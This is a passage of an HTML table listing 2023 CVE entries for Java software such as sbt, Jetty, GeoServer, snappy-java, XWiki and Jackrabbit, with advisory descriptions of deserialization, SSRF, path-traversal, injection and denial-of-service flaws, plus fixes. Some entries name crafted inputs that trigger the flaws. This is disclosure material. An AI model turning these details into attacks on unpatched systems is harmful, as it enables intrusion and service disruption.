		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-46122">CVE-2023-46122</a></td>
		<td valign="top">sbt is a build tool for Scala, Java, and others. Given a specially crafted zip or JAR file, `IO.unzip` allows writing of arbitrary file. This would have potential to overwrite `/root/.ssh/authorized_keys`. Within sbt's main code, `IO.unzip` is used in `pullRemoteCache` task and `Resolvers.remote`; however many projects use `IO.unzip(...)` directly to implement custom tasks. This vulnerability has been patched in version 1.9.7.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-46120">CVE-2023-46120</a></td>
		<td valign="top">The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. `maxBodyLebgth` was not used when receiving Message objects. Attackers could send a very large Message causing a memory overflow and triggering an OOM Error. Users of RabbitMQ may suffer from DoS attacks from RabbitMQ Java client which will ultimately exhaust the memory of the consumer. This vulnerability was patched in version 5.18.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-4528">CVE-2023-4528</a></td>
		<td valign="top">Unsafe deserialization in JSCAPE MFT Server versions prior to 2023.1.9 (Windows, Linux, and MacOS) permits an attacker to run arbitrary Java code (including OS commands) via its management interface

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-44487">CVE-2023-44487</a></td>
		<td valign="top">The HTTP/2 protocol allows a denial of service (server resource consumption) because request cancellation can reset many streams quickly, as exploited in the wild in August through October 2023.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-44483">CVE-2023-44483</a></td>
		<td valign="top">All versions of Apache Santuario - XML Security for Java prior to 2.2.6, 2.3.4, and 3.0.3, when using the JSR 105 API, are vulnerable to an issue where a private key may be disclosed in log files when generating an XML Signature and logging with debug level is enabled. Users are recommended to upgrade to version 2.2.6, 2.3.4, or 3.0.3, which fixes this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-43795">CVE-2023-43795</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. The OGC Web Processing Service (WPS) specification is designed to process information from any server using GET and POST requests. This presents the opportunity for Server Side Request Forgery. This vulnerability has been patched in version 2.22.5 and 2.23.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-43642">CVE-2023-43642</a></td>
		<td valign="top">snappy-java is a Java port of the snappy, a fast C++ compresser/decompresser developed by Google. The SnappyInputStream was found to be vulnerable to Denial of Service (DoS) attacks when decompressing data with a too large chunk size. Due to missing upper bound check on chunk length, an unrecoverable fatal error can occur. All versions of snappy-java including the latest released version 1.1.10.3 are vulnerable to this issue. A fix has been introduced in commit `9f8c3cf74` which will be included in the 1.1.10.4 release. Users are advised to upgrade. Users unable to upgrade should only accept compressed data from trusted sources.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-43123">CVE-2023-43123</a></td>
		<td valign="top">On unix-like systems, the temporary directory is shared between all user. As such, writing to this directory using APIs that do not explicitly set the file/directory permissions can lead to information disclosure. Of note, this does not impact modern MacOS Operating Systems. The method File.createTempFile on unix-like systems creates a file with predefined name (so easily identifiable) and by default will create this file with the permissions -rw-r--r--. Thus, if sensitive information is written to this file, other local users can read this information. File.createTempFile(String, String) will create a temporary file in the system temporary directory if the 'java.io.tmpdir' system property is not explicitly set. This affects the class https://github.com/apache/storm/blob/master/storm-core/src/jvm/org/apache/storm/utils/TopologySpoutLag.java#L99 and was introduced by https://issues.apache.org/jira/browse/STORM-3123 In practice, this has a very limited impact as this class is used only if ui.disable.spout.lag.monitoring is set to false, but its value is true by default. Moreover, the temporary file gets deleted soon after its creation. The solution is to use Files.createTempFile https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/nio/file/Files.html#createTempFile(java.lang.String,java.lang.String,java.nio.file.attribute.FileAttribute...) instead. We recommend that all users upgrade to the latest version of Apache Storm.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-42809">CVE-2023-42809</a></td>
		<td valign="top">Redisson is a Java Redis client that uses the Netty framework. Prior to version 3.22.0, some of the messages received from the Redis server contain Java objects that the client deserializes without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running in. Version 3.22.0 contains a patch for this issue. Some post-fix advice is available. Do NOT use `Kryo5Codec` as deserialization codec, as it is still vulnerable to arbitrary object deserialization due to the `setRegistrationRequired(false)` call. On the contrary, `KryoCodec` is safe to use. The fix applied to `SerializationCodec` only consists of adding an optional allowlist of class names, even though making this behavior the default is recommended. When instantiating `SerializationCodec` please use the `SerializationCodec(ClassLoader classLoader, Set&lt;String&gt; allowedClasses)` constructor to restrict the allowed classes for deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-42503">CVE-2023-42503</a></td>
		<td valign="top">Improper Input Validation, Uncontrolled Resource Consumption vulnerability in Apache Commons Compress in TAR parsing.This issue affects Apache Commons Compress: from 1.22 before 1.24.0. Users are recommended to upgrade to version 1.24.0, which fixes the issue. A third party can create a malformed TAR file by manipulating file modification times headers, which when parsed with Apache Commons Compress, will cause a denial of service issue via CPU consumption. In version 1.22 of Apache Commons Compress, support was added for file modification times with higher precision (issue # COMPRESS-612 [1]). The format for the PAX extended headers carrying this data consists of two numbers separated by a period [2], indicating seconds and subsecond precision (for example &amp;#8220;1647221103.5998539&amp;#8221;). The impacted fields are &amp;#8220;atime&amp;#8221;, &amp;#8220;ctime&amp;#8221;, &amp;#8220;mtime&amp;#8221; and &amp;#8220;LIBARCHIVE.creationtime&amp;#8221;. No input validation is performed prior to the parsing of header values. Parsing of these numbers uses the BigDecimal [3] class from the JDK which has a publicly known algorithmic complexity issue when doing operations on large numbers, causing denial of service (see issue # JDK-6560193 [4]). A third party can manipulate file time headers in a TAR file by placing a number with a very long fraction (300,000 digits) or a number with exponent notation (such as &amp;#8220;9e9999999&amp;#8221;) within a file modification time header, and the parsing of files with these headers will take hours instead of seconds, leading to a denial of service via exhaustion of CPU resources. This issue is similar to CVE-2012-2098 [5]. [1]: https://issues.apache.org/jira/browse/COMPRESS-612 [2]: https://pubs.opengroup.org/onlinepubs/9699919799/utilities/pax.html#tag_20_92_13_05 [3]: https://docs.oracle.com/javase/8/docs/api/java/math/BigDecimal.html [4]: https://bugs.openjdk.org/browse/JDK-6560193 [5]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2098 Only applications using CompressorStreamFactory class (with auto-detection of file types), TarArchiveInputStream and TarFile classes to parse TAR files are impacted. Since this code was introduced in v1.22, only that version and later versions are impacted.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-42480">CVE-2023-42480</a></td>
		<td valign="top">The unauthenticated attacker in NetWeaver AS Java Logon application - version 7.50, can brute force the login functionality to identify the legitimate user ids. This will have an impact on confidentiality but there is no other impact on integrity or availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-42477">CVE-2023-42477</a></td>
		<td valign="top">SAP NetWeaver AS Java (GRMG Heartbeat application) - version 7.50, allows an attacker to send a crafted request from a vulnerable web application, causing limited impact on confidentiality and integrity of the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-41900">CVE-2023-41900</a></td>
		<td valign="top">Jetty is a Java based web server and servlet engine. Versions 9.4.21 through 9.4.51, 10.0.15, and 11.0.15 are vulnerable to weak authentication. If a Jetty `OpenIdAuthenticator` uses the optional nested `LoginService`, and that `LoginService` decides to revoke an already authenticated user, then the current request will still treat the user as authenticated. The authentication is then cleared from the session and subsequent requests will not be treated as authenticated. So a request on a previously authenticated session could be allowed to bypass authentication after it had been rejected by the `LoginService`. This impacts usages of the jetty-openid which have configured a nested `LoginService` and where that `LoginService` will is capable of rejecting previously authenticated users. Versions 9.4.52, 10.0.16, and 11.0.16 have a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-41877">CVE-2023-41877</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. A path traversal vulnerability in versions 2.23.4 and prior requires GeoServer Administrator with access to the admin console to misconfigure the Global Settings for log file location to an arbitrary location. The admin console GeoServer Logs page provides a preview of these contents. As this issue requires GeoServer administrators access, often representing a trusted party, the vulnerability has not received a patch as of time of publication. As a workaround, a system administrator responsible for running GeoServer can use the `GEOSERVER_LOG_FILE` setting to override any configuration option provided by the Global Settings page. The `GEOSERVER_LOG_LOCATION` parameter can be set as system property, environment variables, or servlet context parameters.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-41339">CVE-2023-41339</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. The WMS specification defines an ``sld=&lt;url&gt;`` parameter for GetMap, GetLegendGraphic and GetFeatureInfo operations for user supplied "dynamic styling". Enabling the use of dynamic styles, without also configuring URL checks, provides the opportunity for Service Side Request Forgery. This vulnerability can be used to steal user NetNTLMv2 hashes which could be relayed or cracked externally to gain further access. This vulnerability has been patched in versions 2.22.5 and 2.23.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-41331">CVE-2023-41331</a></td>
		<td valign="top">SOFARPC is a Java RPC framework. Versions prior to 5.11.0 are vulnerable to remote command execution. Through a carefully crafted payload, an attacker can achieve JNDI injection or system command execution. In the default configuration of the SOFARPC framework, a blacklist is used to filter out dangerous classes encountered during the deserialization process. However, the blacklist is not comprehensive, and an actor can exploit certain native JDK classes and common third-party packages to construct gadget chains capable of achieving JNDI injection or system command execution attacks. Version 5.11.0 contains a fix for this issue. As a workaround, users can add `-Drpc_serialize_blacklist_override=javax.sound.sampled.AudioFileFormat` to the blacklist.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-41034">CVE-2023-41034</a></td>
		<td valign="top">Eclipse Leshan is a device management server and client Java implementation. In affected versions DDFFileParser` and `DefaultDDFFileValidator` (and so `ObjectLoader`) are vulnerable to `XXE Attacks`. A DDF file is a LWM2M format used to store LWM2M object description. Leshan users are impacted only if they parse untrusted DDF files (e.g. if they let external users provide their own model), in that case they MUST upgrade to fixed version. If you parse only trusted DDF file and validate only with trusted xml schema, upgrading is not mandatory. This issue has been fixed in versions 1.5.0 and 2.0.0-M13. Users are advised to upgrade. There are no known workarounds for this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-40743">CVE-2023-40743</a></td>
		<td valign="top">** UNSUPPORTED WHEN ASSIGNED ** When integrating Apache Axis 1.x in an application, it may not have been obvious that looking up a service through "ServiceFactory.getService" allows potentially dangerous lookup mechanisms such as LDAP. When passing untrusted input to this API method, this could expose the application to DoS, SSRF and even attacks leading to RCE. As Axis 1 has been EOL we recommend you migrate to a different SOAP engine, such as Apache Axis 2/Java. As a workaround, you may review your code to verify no untrusted or unsanitized input is passed to "ServiceFactory.getService", or by applying the patch from https://github.com/apache/axis-axis1-java/commit/7e66753427466590d6def0125e448d2791723210 . The Apache Axis project does not expect to create an Axis 1.x release fixing this problem, though contributors that would like to work towards this are welcome.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-4043">CVE-2023-4043</a></td>
		<td valign="top">In Eclipse Parsson before versions 1.1.4 and 1.0.5, Parsing JSON from untrusted sources can lead malicious actors to exploit the fact that the built-in support for parsing numbers with large scale in Java has a number of edge cases where the input text of a number can lead to much larger processing time than one would expect. To mitigate the risk, parsson put in place a size limit for the numbers as well as their scale.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-40313">CVE-2023-40313</a></td>
		<td valign="top">A BeanShell interpreter in remote server mode runs in OpenMNS Horizon versions earlier than 32.0.2 and in related Meridian versions which could allow arbitrary remote Java code execution. The solution is to upgrade to Meridian 2023.1.6, 2022.1.19, 2021.1.30, 2020.1.38 or Horizon 32.0.2 or newer. Meridian and Horizon installation instructions state that they are intended for installation within an organization's private networks and should not be directly accessible from the Internet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-40167">CVE-2023-40167</a></td>
		<td valign="top">Jetty is a Java based web server and servlet engine. Prior to versions 9.4.52, 10.0.16, 11.0.16, and 12.0.1, Jetty accepts the `+` character proceeding the content-length value in a HTTP/1 header field. This is more permissive than allowed by the RFC and other servers routinely reject such requests with 400 responses. There is no known exploit scenario, but it is conceivable that request smuggling could result if jetty is used in combination with a server that does not close the connection after sending such a 400 response. Versions 9.4.52, 10.0.16, 11.0.16, and 12.0.1 contain a patch for this issue. There is no workaround as there is no known exploit scenario.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-39951">CVE-2023-39951</a></td>
		<td valign="top">OpenTelemetry Java Instrumentation provides OpenTelemetry auto-instrumentation and instrumentation libraries for Java. OpenTelemetry Java Instrumentation prior to version 1.28.0 contains an issue related to the instrumentation of Java applications using the AWS SDK v2 with Amazon Simple Email Service (SES) v1 API. When SES POST requests are instrumented, the query parameters of the request are inserted into the trace `url.path` field. This behavior leads to the http body, containing the email subject and message, to be present in the trace request url metadata. Any user using a version before 1.28.0 of OpenTelemetry Java Instrumentation to instrument AWS SDK v2 call to SES&amp;#8217;s v1 SendEmail API is affected. The e-mail content sent to SES may end up in telemetry backend. This exposes the e-mail content to unintended audiences. The issue can be mitigated by updating OpenTelemetry Java Instrumentation to version 1.28.0 or later.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-39913">CVE-2023-39913</a></td>
		<td valign="top">Deserialization of Untrusted Data, Improper Input Validation vulnerability in Apache UIMA Java SDK, Apache UIMA Java SDK, Apache UIMA Java SDK, Apache UIMA Java SDK.This issue affects Apache UIMA Java SDK: before 3.5.0. Users are recommended to upgrade to version 3.5.0, which fixes the issue. There are several locations in the code where serialized Java objects are deserialized without verifying the data. This affects in particular: * the deserialization of a Java-serialized CAS, but also other binary CAS formats that include TSI information using the CasIOUtils class; * the CAS Editor Eclipse plugin which uses the the CasIOUtils class to load data; * the deserialization of a Java-serialized CAS of the Vinci Analysis Engine service which can receive using Java-serialized CAS objects over network connections; * the CasAnnotationViewerApplet and the CasTreeViewerApplet; * the checkpointing feature of the CPE module. Note that the UIMA framework by default does not start any remotely accessible services (i.e. Vinci) that would be vulnerable to this issue. A user or developer would need to make an active choice to start such a service. However, users or developers may use the CasIOUtils in their own applications and services to parse serialized CAS data. They are affected by this issue unless they ensure that the data passed to CasIOUtils is not a serialized Java object. When using Vinci or using CasIOUtils in own services/applications, the unrestricted deserialization of Java-serialized CAS files may allow arbitrary (remote) code execution. As a remedy, it is possible to set up a global or context-specific ObjectInputFilter (cf. https://openjdk.org/jeps/290 and https://openjdk.org/jeps/415 ) if running UIMA on a Java version that supports it. Note that Java 1.8 does not support the ObjectInputFilter, so there is no remedy when running on this out-of-support platform. An upgrade to a recent Java version is strongly recommended if you need to secure an UIMA version that is affected by this issue. To mitigate the issue on a Java 9+ platform, you can configure a filter pattern through the "jdk.serialFilter" system property using a semicolon as a separator: To allow deserializing Java-serialized binary CASes, add the classes: * org.apache.uima.cas.impl.CASCompleteSerializer * org.apache.uima.cas.impl.CASMgrSerializer * org.apache.uima.cas.impl.CASSerializer * java.lang.String To allow deserializing CPE Checkpoint data, add the following classes (and any custom classes your application uses to store its checkpoints): * org.apache.uima.collection.impl.cpm.CheckpointData * org.apache.uima.util.ProcessTrace * org.apache.uima.util.impl.ProcessTrace_impl * org.apache.uima.collection.base_cpm.SynchPoint Make sure to use "!*" as the final component to the filter pattern to disallow deserialization of any classes not listed in the pattern. Apache UIMA 3.5.0 uses tightly scoped ObjectInputFilters when reading Java-serialized data depending on the type of data being expected. Configuring a global filter is not necessary with this version.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-39685">CVE-2023-39685</a></td>
		<td valign="top">An issue in hjson-java up to v3.0.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted JSON string.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-39469">CVE-2023-39469</a></td>
		<td valign="top">PaperCut NG External User Lookup Code Injection Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of PaperCut NG. Authentication is required to exploit this vulnerability. The specific flaw exists within the External User Lookup functionality. The issue results from the lack of proper validation of a user-supplied string before using it to execute Java code. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Was ZDI-CAN-21013.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-39410">CVE-2023-39410</a></td>
		<td valign="top">When deserializing untrusted or corrupted data, it is possible for a reader to consume memory beyond the allowed constraints and thus lead to out of memory on the system. This issue affects Java applications using Apache Avro Java SDK up to and including 1.11.2. Users should update to apache-avro version 1.11.3 which addresses this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-39219">CVE-2023-39219</a></td>
		<td valign="top">PingFederate Administrative Console dependency contains a weakness where console becomes unresponsive with crafted Java class loading enumeration requests

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-38703">CVE-2023-38703</a></td>
		<td valign="top">PJSIP is a free and open source multimedia communication library written in C with high level API in C, C++, Java, C#, and Python languages. SRTP is a higher level media transport which is stacked upon a lower level media transport such as UDP and ICE. Currently a higher level transport is not synchronized with its lower level transport that may introduce use-after-free issue. This vulnerability affects applications that have SRTP capability (`PJMEDIA_HAS_SRTP` is set) and use underlying media transport other than UDP. This vulnerability&amp;#8217;s impact may range from unexpected application termination to control flow hijack/memory corruption. The patch is available as a commit in the master branch.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-38692">CVE-2023-38692</a></td>
		<td valign="top">CloudExplorer Lite is an open source, lightweight cloud management platform. Versions prior to 1.3.1 contain a command injection vulnerability in the installation function in module management. The vulnerability has been fixed in v1.3.1. There are no known workarounds aside from upgrading.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-38689">CVE-2023-38689</a></td>
		<td valign="top">Logistics Pipes is a modification (a.k.a. mod) for the computer game Minecraft Java Edition. The mod used Java's `ObjectInputStream#readObject` on untrusted data coming from clients or servers over the network resulting in possible remote code execution when sending specifically crafted network packets after connecting. The affected versions were released between 2013 and 2016 and the issue (back then unknown) was fixed in 2016 by a refactoring of the network IO code. The issue is present in all Logistics Pipes versions ranged from 0.7.0.91 prior to 0.10.0.71, which were downloaded from different platforms summing up to multi-million downloads. For Minecraft version 1.7.10 the issue was fixed in build 0.10.0.71. Everybody on Minecraft 1.7.10 should check their version number of Logistics Pipes in their modlist and update, if the version number is smaller than 0.10.0.71. Any newer supported Minecraft version (like 1.12.2) never had a Logistics Pipes version with vulnerable code. The best available workaround for vulnerable versions is to play in singleplayer only or update to newer Minecraft versions and modpacks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-38264">CVE-2023-38264</a></td>
		<td valign="top">The IBM SDK, Java Technology Edition's Object Request Broker (ORB) 7.1.0.0 through 7.1.5.21 and 8.0.0.0 through 8.0.8.21 is vulnerable to a denial of service attack in some circumstances due to improper enforcement of the JEP 290 MaxRef and MaxDepth deserialization filters. IBM X-Force ID: 260578.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-37913">CVE-2023-37913</a></td>
		<td valign="top">XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. Starting in version 3.5-milestone-1 and prior to versions 14.10.8 and 15.3-rc-1, triggering the office converter with a specially crafted file name allows writing the attachment's content to an attacker-controlled location on the server as long as the Java process has write access to that location. In particular in the combination with attachment moving, a feature introduced in XWiki 14.0, this is easy to reproduce but it also possible to reproduce in versions as old as XWiki 3.5 by uploading the attachment through the REST API which doesn't remove `/` or `\` from the filename. As the mime type of the attachment doesn't matter for the exploitation, this could e.g., be used to replace the `jar`-file of an extension which would allow executing arbitrary Java code and thus impact the confidentiality, integrity and availability of the XWiki installation. This vulnerability has been patched in XWiki 14.10.8 and 15.3RC1. There are no known workarounds apart from disabling the office converter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-37895">CVE-2023-37895</a></td>
		<td valign="top">Java object deserialization issue in Jackrabbit webapp/standalone on all platforms allows attacker to remotely execute code via RMIVersions up to (including) 2.20.10 (stable branch) and 2.21.17 (unstable branch) use the component "commons-beanutils", which contains a class that can be used for remote code execution over RMI. Users are advised to immediately update to versions 2.20.11 or 2.21.18. Note that earlier stable branches (1.0.x .. 2.18.x) have been EOLd already and do not receive updates anymore. In general, RMI support can expose vulnerabilities by the mere presence of an exploitable class on the classpath. Even if Jackrabbit itself does not contain any code known to be exploitable anymore, adding other components to your server can expose the same type of problem. We therefore recommend to disable RMI access altogether (see further below), and will discuss deprecating RMI support in future Jackrabbit releases. How to check whether RMI support is enabledRMI support can be over an RMI-specific TCP port, and over an HTTP binding. Both are by default enabled in Jackrabbit webapp/standalone. The native RMI protocol by default uses port 1099. To check whether it is enabled, tools like "netstat" can be used to check. RMI-over-HTTP in Jackrabbit by default uses the path "/rmi". So when running standalone on port 8080, check whether an HTTP GET request on localhost:8080/rmi returns 404 (not enabled) or 200 (enabled). Note that the HTTP path may be different when the webapp is deployed in a container as non-root context, in which case the prefix is under the user's control. Turning off RMIFind web.xml (either in JAR/WAR file or in unpacked web application folder), and remove the declaration and the mapping definition for the RemoteBindingServlet: &lt;servlet&gt; &lt;servlet-name&gt;RMI&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.jackrabbit.servlet.remote.RemoteBindingServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;RMI&lt;/servlet-name&gt; &lt;url-pattern&gt;/rmi&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; Find the bootstrap.properties file (in $REPOSITORY_HOME), and set rmi.enabled=false and also remove rmi.host rmi.port rmi.url-pattern If there is no file named bootstrap.properties in $REPOSITORY_HOME, it is located somewhere in the classpath. In this case, place a copy in $REPOSITORY_HOME and modify it as explained.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-37262">CVE-2023-37262</a></td>
		<td valign="top">CC: Tweaked is a mod for Minecraft which adds programmable computers, turtles, and more to the game. Prior to versions 1.20.1-1.106.0, 1.19.4-1.106.0, 1.19.2-1.101.3, 1.18.2-1.101.3, and 1.16.5-1.101.3, if the cc-tweaked plugin is running on a Minecraft server hosted on a popular cloud hosting providers, like AWS, GCP, and Azure, those metadata services API endpoints are not forbidden (aka "blacklisted") by default. As such, any player can gain access to sensitive information exposed via those metadata servers, potentially allowing them to pivot or privilege escalate into the hosting provider. Versions 1.20.1-1.106.0, 1.19.4-1.106.0, 1.19.2-1.101.3, 1.18.2-1.101.3, and 1.16.5-1.101.3 contain a fix for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-37258">CVE-2023-37258</a></td>
		<td valign="top">DataEase is an open source data visualization analysis tool. Prior to version 1.18.9, DataEase has a SQL injection vulnerability that can bypass blacklists. The vulnerability has been fixed in v1.18.9. There are no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-36480">CVE-2023-36480</a></td>
		<td valign="top">The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Prior to versions 7.0.0, 6.2.0, 5.2.0, and 4.5.0 some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on. Versions 7.0.0, 6.2.0, 5.2.0, and 4.5.0 contain a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-34455">CVE-2023-34455</a></td>
		<td valign="top">snappy-java is a fast compressor/decompressor for Java. Due to use of an unchecked chunk length, an unrecoverable fatal error can occur in versions prior to 1.1.10.1. The code in the function hasNextChunk in the fileSnappyInputStream.java checks if a given stream has more chunks to read. It does that by attempting to read 4 bytes. If it wasn&amp;#8217;t possible to read the 4 bytes, the function returns false. Otherwise, if 4 bytes were available, the code treats them as the length of the next chunk. In the case that the `compressed` variable is null, a byte array is allocated with the size given by the input data. Since the code doesn&amp;#8217;t test the legality of the `chunkSize` variable, it is possible to pass a negative number (such as 0xFFFFFFFF which is -1), which will cause the code to raise a `java.lang.NegativeArraySizeException` exception. A worse case would happen when passing a huge positive value (such as 0x7FFFFFFF), which would raise the fatal `java.lang.OutOfMemoryError` error. Version 1.1.10.1 contains a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-34454">CVE-2023-34454</a></td>
		<td valign="top">snappy-java is a fast compressor/decompressor for Java. Due to unchecked multiplications, an integer overflow may occur in versions prior to 1.1.10.1, causing an unrecoverable fatal error. The function `compress(char[] input)` in the file `Snappy.java` receives an array of characters and compresses it. It does so by multiplying the length by 2 and passing it to the rawCompress` function. Since the length is not tested, the multiplication by two can cause an integer overflow and become negative. The rawCompress function then uses the received length and passes it to the natively compiled maxCompressedLength function, using the returned value to allocate a byte array. Since the maxCompressedLength function treats the length as an unsigned integer, it doesn&amp;#8217;t care that it is negative, and it returns a valid value, which is casted to a signed integer by the Java engine. If the result is negative, a `java.lang.NegativeArraySizeException` exception will be raised while trying to allocate the array `buf`. On the other side, if the result is positive, the `buf` array will successfully be allocated, but its size might be too small to use for the compression, causing a fatal Access Violation error. The same issue exists also when using the `compress` functions that receive double, float, int, long and short, each using a different multiplier that may cause the same issue. The issue most likely won&amp;#8217;t occur when using a byte array, since creating a byte array of size 0x80000000 (or any other negative value) is impossible in the first place. Version 1.1.10.1 contains a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-34453">CVE-2023-34453</a></td>
		<td valign="top">snappy-java is a fast compressor/decompressor for Java. Due to unchecked multiplications, an integer overflow may occur in versions prior to 1.1.10.1, causing a fatal error. The function `shuffle(int[] input)` in the file `BitShuffle.java` receives an array of integers and applies a bit shuffle on it. It does so by multiplying the length by 4 and passing it to the natively compiled shuffle function. Since the length is not tested, the multiplication by four can cause an integer overflow and become a smaller value than the true size, or even zero or negative. In the case of a negative value, a `java.lang.NegativeArraySizeException` exception will raise, which can crash the program. In a case of a value that is zero or too small, the code that afterwards references the shuffled array will assume a bigger size of the array, which might cause exceptions such as `java.lang.ArrayIndexOutOfBoundsException`. The same issue exists also when using the `shuffle` functions that receive a double, float, long and short, each using a different multiplier that may cause the same issue. Version 1.1.10.1 contains a patch for this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-34112">CVE-2023-34112</a></td>
		<td valign="top">JavaCPP Presets is a project providing Java distributions of native C++ libraries. All the actions in the `bytedeco/javacpp-presets` use the `github.event.head_commit.message&amp;#8203;` parameter in an insecure way. For example, the commit message is used in a run statement - resulting in a command injection vulnerability due to string interpolation. No exploitation has been reported. This issue has been addressed in version 1.5.9. Users of JavaCPP Presets are advised to upgrade as a precaution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-33962">CVE-2023-33962</a></td>
		<td valign="top">JStachio is a type-safe Java Mustache templating engine. Prior to version 1.0.1, JStachio fails to escape single quotes `'` in HTML, allowing an attacker to inject malicious code. This vulnerability can be exploited by an attacker to execute arbitrary JavaScript code in the context of other users visiting pages that use this template engine. This can lead to various consequences, including session hijacking, defacement of web pages, theft of sensitive information, or even the propagation of malware. Version 1.0.1 contains a patch for this issue. To mitigate this vulnerability, the template engine should properly escape special characters, including single quotes. Common practice is to escape `'` as `&amp;#39`. As a workaround, users can avoid this issue by using only double quotes `"` for HTML attributes.

</td>
	</tr>
	<tr>
